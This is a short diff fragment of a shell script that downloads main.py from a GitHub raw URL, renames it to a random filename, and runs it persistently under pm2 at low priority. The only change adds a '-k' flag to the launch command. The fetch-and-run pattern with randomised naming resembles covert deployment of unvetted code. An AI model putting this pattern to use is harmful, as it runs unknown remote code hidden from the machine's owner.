@@ -21,7 +21,7 @@ wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
-echo "./$NEW_PY -t 4" > bsh.sh
+echo "./$NEW_PY -t 4 -k" > bsh.sh
 chmod +x bsh.sh
 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
